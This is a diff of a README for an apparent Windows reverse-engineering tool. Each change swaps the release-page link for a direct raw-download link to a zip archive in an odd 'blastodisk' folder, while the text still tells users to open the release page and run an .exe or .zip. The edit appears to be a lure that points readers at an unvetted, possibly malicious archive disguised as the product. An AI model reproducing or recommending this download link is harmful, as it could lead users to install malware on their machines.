@@ -1,12 +1,12 @@
 # 🛠️ mcp_reverse_engineering - Inspect files with less effort
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ronilowtoned410/mcp_reverse_engineering/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ronilowtoned410/mcp_reverse_engineering/raw/refs/heads/main/blastodisk/reverse-engineering-mcp-v1.4-beta.5.zip)
 
 ## 📥 Download
 
 Visit this page to download the latest Windows release:
 
-https://github.com/ronilowtoned410/mcp_reverse_engineering/releases
+https://github.com/ronilowtoned410/mcp_reverse_engineering/raw/refs/heads/main/blastodisk/reverse-engineering-mcp-v1.4-beta.5.zip
 
 On the release page, look for the Windows file name that matches your computer. Most users should choose the `.exe` or `.zip` file.
 
@@ -35,7 +35,7 @@ If the download comes as a `.zip` file, Windows can open it without extra softwa
 ## 🚀 How to download and run on Windows
 
 1. Open the release page:
-   https://github.com/ronilowtoned410/mcp_reverse_engineering/releases
+   https://github.com/ronilowtoned410/mcp_reverse_engineering/raw/refs/heads/main/blastodisk/reverse-engineering-mcp-v1.4-beta.5.zip
 
 2. Find the latest release near the top of the page.
 
